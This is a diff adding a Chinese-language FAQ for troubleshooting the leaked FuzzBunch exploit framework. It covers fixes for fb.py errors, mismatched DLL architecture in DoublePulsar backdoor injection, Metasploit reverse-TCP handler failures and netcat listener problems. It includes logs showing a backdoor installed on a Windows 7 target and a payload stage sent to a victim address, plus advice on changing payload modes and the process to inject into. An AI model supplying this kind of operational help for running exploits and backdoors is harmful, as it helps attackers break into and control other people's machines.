@@ -1,0 +1,34 @@
+Q: 在运行FB.PY时，提示：WindowsError: [Error 3] The system cannot find the path specified: 'C:\\Users\\abh\\Desktop\\fuzzbunch-master\\listeningposts/*.*'
+A: make dir 'listeningposts' in fuzzbunch-master or windows can solve it
+
+Q:在运行FB.PY时，提示：ImportError: DLL load failed: 找不到指定的模块。
+A:确保安装的python版本为2.6.6 32bit ，并且正确安装了对应的pywin32 （pywin32-221.win32-py2.6.exe）
+
+Q：在进行DLL注入时，出现如下错误：
+SMB Connection string is: Windows 7 Ultimate 7601 Service Pack 1
+    Target OS is: 7 x64
+    Target SP is: 1
+        [+] Backdoor installed
+        [-] DLL Architecture is: 32 bit
+Error sending wrong architecture DLL to target
+        [-] DLL NOT built
+[!] Plugin failed
+[-] Error: Doublepulsar Failed
+A：在生成DLL时，需要根据目标系统的类型进行更改，目标是32bit系统，则需要生成32bit的DLL文件。
+
+Q： 在使用msf监听反弹时，出现如下错误：
+msf exploit(handler) > exploit 
+[*] Started reverse TCP handler on 192.168.42.203:12345
+[*] Starting the payload handler…
+[*] Sending stage (957487 bytes) to 192.168.42.147
+[-] Errno::ECONNRESET Connection reset by peer – SSL_accept
+A：此问题多发生在win2008r2 64位，在生成DLL文件时，更好reverse_tcp为其他模式。
+
+Q：使用NC监听反弹时，出现如下情况：
+nc -vvl 26850
+Connection from xx.xx.xx.xxx port 26850 [tcp/*] accepted
+ SMBrS þ@bPC NETWORK PROGRAM 1.0LANMAN1.0Windows for Workgroups 3.1aLM1.2X002LANMAN2.1NT LM 0.12
+A：在选择注入进程名称processname时，选择explorer.exe可能会解决该问题
+
+Q：FB.PY 和 START.JAR有什么关系和区别?
+A: fb.py及shell环境下的主程序，start.jar为对前面的封装，提供了GUI的配置界面。类似于msfconsole和cobaltstrike
